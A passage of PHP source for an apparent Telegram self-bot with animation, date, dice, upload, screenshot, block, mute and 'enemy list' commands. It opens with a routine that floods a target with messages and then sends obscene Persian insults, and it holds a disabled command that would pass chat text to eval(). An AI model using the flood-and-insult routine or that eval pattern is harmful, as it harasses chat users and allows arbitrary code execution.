                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '7']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '8']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '9']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '10']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '1']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '2']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '3']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '4']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '5']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '6']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '7']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '8']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '9']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '10']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '1']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '2']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '3']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '4']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '5']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '6']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '7']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '8']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '9']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '10']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '1']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '2']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '3']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '4']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '5']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '6']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '7']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '8']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '9']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '10']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'NABINAM DIGE GOHE EZAFE BOKHORIA']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'KOS NANAT GAYIDE SHOD BINAMUS!!! SHOT SHODI BINAMUS!BYE']);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);

                    }
                    if ($text == 'biorandom' or $text == 'بیو شانسی') {
                        $txt = yield $this->fileGetContents("https://api-smoketm.cf/api/text/txt.php");
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => $txt]);
                    }

                    if ($text == 'زنبور2' or $text == 'vizviz2') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🏥__________🏃‍♂️______________🐝']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏥______🏃‍♂️_______🐝']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏥______🏃‍♂️_____🐝']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏥___🏃‍♂️___🐝']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏥_🏃‍♂️_🐝']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'در رفت عه☹️🐝']);
                    }


                    if ($text == '/proxy' or $text == 'پروکسی' or $text == 'پروکسی میخوام' or $text == 'proxy bde' or $text == 'prox' or $text == 'پروکس' or $text == 'پروکصی') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "↫↫↫↫↫ ｍ𝐓ρ𝐫ｏ𝓽๏ ρяＯ𝔵Ⓨ 𝓕σг ｔＥㄥ𝓔𝓰я𝓪м ↬↬↬↬↬
  
http://api.codebazan.ir/mtproto/?type=html&channel=ProxyMTProto
↫↫↫↫↫ ｍ𝐓ρ𝐫ｏ𝓽๏ ρяＯ𝔵Ⓨ 𝓕σг ｔＥㄥ𝓔𝓰я𝓪м ↬↬↬↬↬"]);
                    }

                    if ($text == 'زنبور' or $text == 'vizviz') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🏃‍♂😥________________🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥_______________🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥______________🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥_____________🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥____________🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥___________🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥__________🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥_________🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥________🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥_______🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥______🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥____🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥___🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥__🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥_🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👨‍🦽😭🥺']);
                    }

                    if ($text == '2قلب' or $text == 'Love2') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '💚💚💚💚💚']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💛💛💛💛💛']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧡🧡🧡🧡🧡']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💛💛💛💛💛']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💖💖💖💖💖']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💞💞💞💞💞']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💝💝💝💝💝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💕💕💕💕💕']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💗💗💗💗💗']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'I love🙂🧡']);
                    }
                    if ($text == 'گوه' or $text == 'goh') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'G']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'O']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'H']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'N']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'A']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'KH']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'O']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'R']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'GOH NAKHOR💩']);
                    }

                    if ($text == 'بمیر کرونا' or $text == 'Corona') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🦠  •   •   •   •   •   •   •   •   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  •   •   •   •   •   •   •   •   •   ◀  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  •   •   •   •   •   •   •   •   ◀   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  •   •   •   •   •   •   •   ◀   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  •   •   •   •   •   •   ◀   •   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  •   •   •   •   •   ◀   •   •   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  •   •   •   •   ◀   •   •   •   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  •   •   •   ◀   •   •   •   •   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  •   •   ◀   •   •   •   •   •   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  •   ◀   •   •   •   •   •   •   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  ◀   •   •   •   •   •   •   •   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💥  •   •   •   •   •   •   •   •   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💉💊💉💊💉💊💉💊']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'we wine']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'Corona Is Dead']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🇩🇪Pawn_Self کیرونارو شکست داد🇩🇪']);
                    }
                    if ($text == 'انگش' or $text == 'سولاخ') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '👌________________👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌_______________👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌______________👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌_____________👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌____________👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌___________👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌__________👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌_________👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌________👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌_______👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌______👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌____👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌___👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌__👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌_👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '✌انگشت شد✌']);
                    }

                    if ($text == 'فیل' or $text == 'عشقمی') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
░░▄███▄███▄ 
░░█████████ 
░░▒▀█████▀░ 
░░▒░░▀█▀ 
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
░░▄███▄███▄ 
░░█████████ 
░░▒▀█████▀░ 
░░▒░░▀█▀ 
░░▒░░█░ 
░░▒░█ 
░░░█ 
░░█░░░░███████ 
░██░░░██▓▓███▓██▒ 
██░░░█▓▓▓▓▓▓▓█▓████ 
██░░██▓▓▓(◐)▓█▓█▓█ 
███▓▓▓█▓▓▓▓▓█▓█▓▓▓▓█ 
▀██▓▓█░██▓▓▓▓██▓▓▓▓▓█ 
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
░░▄███▄███▄ 
░░█████████ 
░░▒▀█████▀░ 
░░▒░░▀█▀ 
░░▒░░█░ 
░░▒░█ 
░░░█ 
░░█░░░░███████ 
░██░░░██▓▓███▓██▒ 
██░░░█▓▓▓▓▓▓▓█▓████ 
██░░██▓▓▓(◐)▓█▓█▓█ 
███▓▓▓█▓▓▓▓▓█▓█▓▓▓▓█ 
▀██▓▓█░██▓▓▓▓██▓▓▓▓▓█ 
░▀██▀░░█▓▓▓▓▓▓▓▓▓▓▓▓▓█ 
░░░░▒░░░█▓▓▓▓▓█▓▓▓▓▓▓█ 
░░░░▒░░░█▓▓▓▓█▓█▓▓▓▓▓█ 
░▒░░▒░░░█▓▓▓█▓▓▓█▓▓▓▓█ 
░▒░░▒░░░█▓▓▓█░░░█▓▓▓█ 
░▒░░▒░░██▓██░░░██▓▓██
"]);
                    }
                    if (preg_match("/^\/[Tt][Aa][Ss]\s(\d)/", $text, $rr)) {
                        @touch("tas.txt");
                        $count = $rr[1];
                        @file_put_contents("tas.txt", $rr[1]);
                        if ($count >= 7) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Chizi zadi? dice bishtar az 6 ta nis", 'parse_mode' => 'MarkDown']);
                        } else {
                            $diceo = ['_' => 'inputMediaDice', 'emoticon' => '🎲'];
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗗𝗶𝗰𝗲 𝗡𝘂𝗺𝗯𝗲𝗿 [ $rr[1] ]", 'parse_mode' => 'markdown']);
                            yield $this->messages->sendMedia(['peer' => $peer, 'media' => $diceo, 'message' => "🎲"]);
                        }
                    }
                    if (isset($update['message']['media']['_'])) {
                        if ($update['message']['media']['_'] == "messageMediaDice") {
                            if (is_numeric(file_get_contents("tas.txt"))) {
                                $valueo = $update['message']['media']['value'];
                                if (file_exists("tas.txt") and $valueo != file_get_contents("tas.txt")) {
                                    yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                                    $diceo = ['_' => 'inputMediaDice', 'emoticon' => '🎲'];
                                    yield $this->messages->sendMedia(['peer' => $peer, 'media' => $diceo, 'message' => "🎲"]);
                                } else {
                                    unlink("tas.txt");
                                }
                            }
                        }
                    }
                    if ($text == 'time' or $text == 'ساعت' or $text == 'تایم') {
                        date_default_timezone_set('Asia/Tehran');
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => ';)']);
                        for ($i = 1; $i <= 5; $i++) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => date('H:i:s')]);
                            yield $this->sleep(1);
                        }
                    }

                    if ($text == 'تاریخ شمسی') {
                        $fasl = jdate('f');
                        $month_name = jdate('F');
                        $day_name = jdate('l');
                        $tarikh = jdate('y/n/j');
                        $hour = jdate('H:i:s - a');
                        $animal = jdate('q');
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "امروز  $day_name  |$tarikh|

نام ماه🌙: $month_name

نام فصل ❄️: $fasl

ساعت ⌚️: $hour

نام حیوان امسال : $animal
"]);
                    }

                    if ($text == 'تاریخ میلادی') {
                        date_default_timezone_set('UTC');
                        $rooz = date("l"); // روز
                        $tarikh = date("Y/m/d"); // سال
                        $mah = date("F"); // نام ماه
                        $hour = date('H:i:s - A'); // ساعت
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "today  $rooz |$tarikh|

month name🌙: $mah

time⌚️: $hour"]);
                    }


                    if (preg_match("/^[\/\#\!]?(setanswer) (.*)$/si", $text)) {
                        $ip = trim(str_replace("/setanswer ", "", $text));
                        $ip = explode("|", $ip . "|||||");
                        $txxt = trim($ip[0]);
                        $answeer = trim($ip[1]);
                        if (!isset($data['answering'][$txxt])) {
                            $data['answering'][$txxt] = $answeer;
                            yield $this->filePutContents("data.json", json_encode($data));
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ɴᴇᴡ ᴡᴏʀᴅ ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀɴꜱᴡᴇʀ ʟɪꜱᴛ🏻"]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜɪꜱ ᴡᴏʀᴅ ᴀʟʀᴇᴀᴅʏ ᴇxɪꜱᴛꜱ"]);
                        }
                    }
                    /*
                        if (preg_match("/^[\/\#\!]?(php) (.*)$/si", $text)) {
                            preg_match("/^[\/\#\!]?(php) (.*)$/si", $text, $a);


                            if (strpos($a[2], '$MadelineProto') === false and strpos($a[2], '$this') === false) {
                                $OutPut = eval("$a[2]");
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "`🔻 $OutPut`", 'parse_mode' => 'markdown']);
                            }
                        }*/

                    if (preg_match("/^[\/\#\!]?(screen) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(screen) (.*)$/si", $text, $m);

                        $mi = $m[2];
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ɢᴇᴛᴛɪɴɢ ꜱᴄʀᴇᴇɴꜱʜᴏᴛ ꜰʀᴏᴍ ⁅ $m[2] ⁆ ᴡᴇʙ ꜱɪᴛᴇ", 'parseMarkDown_mode' => ""]);

                        $ound = "https://api.codebazan.ir/webshot/?text=1000&domain=" . $mi;
                        $inputMediaGifExternal = ['_' => 'inputMediaGifExternal', 'url' => $ound];
                        $Updates = $this->messages->sendMedia(['peer' => $peer, 'media' => $inputMediaGifExternal, 'reply_to_msg_id' => $msg_id, 'message' => "ꜱᴄʀᴇᴇɴꜱʜᴏᴛ ᴡᴀꜱ ᴘʀᴇᴘᴀʀᴇᴅ ꜰʀᴏᴍ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱɪᴛᴇ 📸"]);
                    }

                    if (preg_match("/^[\/\#\!]?(upload) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(upload) (.*)$/si", $text, $a);
                        $oldtime = time();
                        $link = $a[2];
                        $ch = curl_init($link);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
                        curl_setopt($ch, CURLOPT_HEADER, TRUE);
                        curl_setopt($ch, CURLOPT_NOBODY, TRUE);
                        $data = curl_exec($ch);
                        $size1 = curl_getinfo($ch, CURLINFO_CONTENT_LENGTH_DOWNLOAD);
                        curl_close($ch);
                        $size = round($size1 / 1024 / 1024, 1);
                        if ($size <= 200.9) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '🌵 Please Wait...
💡 FileSize : ' . $size . 'MB']);
                            $path = parse_url($link, PHP_URL_PATH);
                            $filename = basename($path);
                            copy($link, "files/$filename");
                            yield $this->messages->sendMedia([
                                'peer' => $peer,
                                'media' => [
                                    '_' => 'inputMediaUploadedDocument',
                                    'file' => "files/$filename",
                                    'attributes' => [['_' => 'documentAttributeFilename',
                                        'file_name' => "$filename"]]],
                                'message' => "🔖 Name : $filename
💠 [Your File !]($link)
💡 Size : " . $size . 'MB',
                                'parse_mode' => 'Markdown'
                            ]);
                            $t = time() - $oldtime;
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "✅ ᴜᴘʟᴏᴀᴅᴇᴅ ($t" . 's)']);
                            unlink("files/$filename");
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '⚠️ خطا : حجم فایل بیشتر از 200 مگ است!']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(delanswer) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(delanswer) (.*)$/si", $text, $text);
                        $txxt = $text[2];
                        if (isset($data['answering'][$txxt])) {
                            unset($data['answering'][$txxt]);
                            yield $this->filePutContents("data.json", json_encode($data));
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "**֍ 𝑻𝒉𝒆 𝑾𝒐𝒓𝒅 𝑾𝒂𝒔 𝑹𝒆𝒎𝒐𝒗𝒆𝒅 𝑭𝒓𝒐𝒎 𝑻𝒉𝒆 𝑨𝒏𝒔𝒘𝒆𝒓 𝑳𝒊𝒔𝒕!**", 'parse_mode' => 'markdown']);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "**֍ 𝑻𝒉𝒊𝒔 𝑾𝒐𝒓𝒅 𝑰𝒔 𝑴𝒊𝒔𝒔𝒊𝒏𝒈 𝑰𝒏 𝑻𝒉𝒆 𝑨𝒏𝒔𝒘𝒆𝒓 𝑳𝒊𝒔𝒕!**", 'parse_mode' => 'markdown']);
                        }
                    }
                    if ($text == '/id' or $text == 'id') {
                        if (isset($message['reply_to_msg_id'])) {
                            if ($type3 == 'supergroup' or $type3 == 'chat') {
                                $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '**֍ 𝒀𝒐𝒖𝒓 𝑰𝑫 :** ' . $messag, 'parse_mode' => 'markdown']);
                            } else {
                                if ($type3 == 'user') {
                                    yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍ 𝒀𝒐𝒖𝒓 𝑰𝑫 :** `$peer`", 'parse_mode' => 'markdown']);
                                }
                            }
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍ 𝑮𝒓𝒐𝒖𝒑 𝑰𝑫 :** `$peer`", 'parse_mode' => 'markdown']);
                        }
                    }
                    if (isset($update['message']['reply_to']['reply_to_msg_id'])) {
                        if (preg_match("/^[\/\#\!]?(pin)$/si", $text)) {
                            if ($type3 == 'supergroup' or $type3 == 'chat') {
                                $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                                yield $this->messages->updatePinnedMessage(['silent' => true, 'unpin' => false, 'pm_oneside' => false, 'peer' => $peer, 'id' => $gmsg,]);
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍ 𝑷𝒊𝒏𝒏𝒆𝒅!**", 'parse_mode' => 'Markdown']);
                            }
                        }
                        if (preg_match("/^[\/\#\!]?(block)$/si", $text)) {
                            $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                            if (in_array($type3, ['channel', 'supergroup'])) {
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                            } else {
                                $gms = yield $this->messages->getMessages(['id' => [$gmsg]]);
                                $m = $gms['messages'][0];
                                $messag = $m['from_id']['user_id'] ?? $m['peer_id']['user_id'];
                            }
                            yield $this->contacts->block(['id' => $messag]);
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍** [𝑼𝒔𝒆𝒓](mention:$messag) **𝑩𝒍𝒐𝒄𝒌𝒆𝒅!**", 'parse_mode' => 'Markdown']);
                        }
                        if (preg_match("/^[\/\#\!]?(unblock)$/si", $text)) {
                            $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                            if (in_array($type3, ['channel', 'supergroup'])) {
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                            } else {
                                $gms = yield $this->messages->getMessages(['id' => [$gmsg]]);
                                $m = $gms['messages'][0];
                                $messag = $m['from_id']['user_id'] ?? $m['peer_id']['user_id'];
                            }
                            yield $this->contacts->unblock(['id' => $messag]);
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍** [𝑼𝒔𝒆𝒓](mention:$messag) **𝑼𝒏𝒃𝒍𝒐𝒄𝒌𝒆𝒅!**", 'parse_mode' => 'Markdown']);
                        }
                        if (preg_match("/^[\/\#\!]?(setenemy)$/si", $text)) {
                            $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                            if (in_array($type3, ['channel', 'supergroup'])) {
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                            } else {
                                $gms = yield $this->messages->getMessages(['id' => [$gmsg]]);
                                $m = $gms['messages'][0];
                                $messag = $m['from_id']['user_id'] ?? $m['peer_id']['user_id'];
                            }
                            if (!in_array($messag, $data['enemies'])) {
                                $data['enemies'][] = $messag;
                                yield $this->filePutContents("data.json", json_encode($data));
                                yield $this->contacts->block(['id' => $messag]);
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍** [𝑼𝒔𝒆𝒓](mention:$messag) **𝑰𝒔 𝑵𝒐𝒘 𝑬𝒏𝒆𝒎𝒚𝑳𝒊𝒔𝒕!**", 'parse_mode' => 'Markdown']);
                            } else {
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍** [𝑼𝒔𝒆𝒓](mention:$messag) **𝑾𝒂𝒔 𝑰𝒏 𝑬𝒏𝒆𝒎𝒚𝑳𝒊𝒔𝒕!**", 'parse_mode' => 'Markdown']);
                            }
                        }
                        if (preg_match("/^[\/\#\!]?(delenemy)$/si", $text)) {
                            $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                            if (in_array($type3, ['channel', 'supergroup'])) {
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                            } else {
                                $gms = yield $this->messages->getMessages(['id' => [$gmsg]]);
                                $m = $gms['messages'][0];
                                $messag = $m['from_id']['user_id'] ?? $m['peer_id']['user_id'];
                            }
                            if (in_array($messag, $data['enemies'])) {
                                $k = array_search($messag, $data['enemies']);
                                unset($data['enemies'][$k]);
                                yield $this->filePutContents("data.json", json_encode($data));
                                yield $this->contacts->unblock(['id' => $messag]);
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍** [𝑼𝒔𝒆𝒓](mention:$messag) **𝑫𝒆𝒍𝒆𝒕𝒆𝒅 𝑭𝒓𝒐𝒎 𝑬𝒏𝒆𝒎𝒚𝑳𝒊𝒔𝒕!**", 'parse_mode' => 'Markdown']);
                            } else {
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍** [𝑼𝒔𝒆𝒓](mention:$messag) **𝑾𝒂𝒔𝒏'𝒕 𝑰𝒏 𝑬𝒏𝒆𝒎𝒚𝑳𝒊𝒔𝒕!**", 'parse_mode' => 'Markdown']);
                            }
                        }
                        if (preg_match("/^[\/\#\!]?(silent)$/si", $text)) {
                            if ($type3 == 'supergroup' or $type3 == 'chat') {
                                $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                                $messag1 = $gmsg['messages'][0]['reply_to']['reply_to_msg_id'];
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                                $mute = ['_' => 'chatBannedRights', 'send_messages' => true, 'send_media' => true, 'send_stickers' => true, 'send_gifs' => true, 'send_games' => true, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
                                yield $this->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $mute,]);
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍** [𝑼𝒔𝒆𝒓](mention:$messag) **𝒘𝒂𝒔 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑺𝒊𝒍𝒆𝒏𝒕𝒆𝒅!**", 'parse_mode' => 'Markdown']);
                            }
                        }
                        if (preg_match("/^[\/\#\!]?(unsilent)$/si", $text)) {
                            if ($type3 == 'supergroup' or $type3 == 'chat') {
                                $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
